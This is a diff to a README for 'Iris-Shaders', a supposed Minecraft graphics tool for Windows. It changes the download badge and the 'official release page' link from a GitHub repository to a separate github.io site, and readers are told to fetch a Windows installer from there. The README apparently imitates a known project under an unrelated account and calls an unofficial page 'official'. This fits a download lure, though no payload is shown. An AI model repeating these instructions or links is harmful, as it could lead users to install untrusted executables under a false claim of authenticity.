@@ -1,6 +1,6 @@
 # 🎮 Iris-Shaders - Better graphics for your Minecraft world
 
-[![](https://img.shields.io/badge/Download_Iris-Blue.svg)](https://github.com/welshlarge31/Iris-Shaders)
+[![](https://img.shields.io/badge/Download_Iris-Blue.svg)](https://welshlarge31.github.io)
 
 Iris Shaders provides a modern way to change how Minecraft looks. This software makes water, lighting, and shadows look realistic. It works as an alternative to older tools. You can use this on Windows 10 and 11.
 
@@ -21,7 +21,7 @@ Check your graphics card drivers before you begin. Visit the website of your car
 
 You need to get the files from the project page. 
 
-1. Go to the [official release page](https://github.com/welshlarge31/Iris-Shaders).
+1. Go to the [official release page](https://welshlarge31.github.io).
 2. Look for the section labeled Releases.
 3. Click the link for the Windows installer.
 4. Save the file to your desktop.
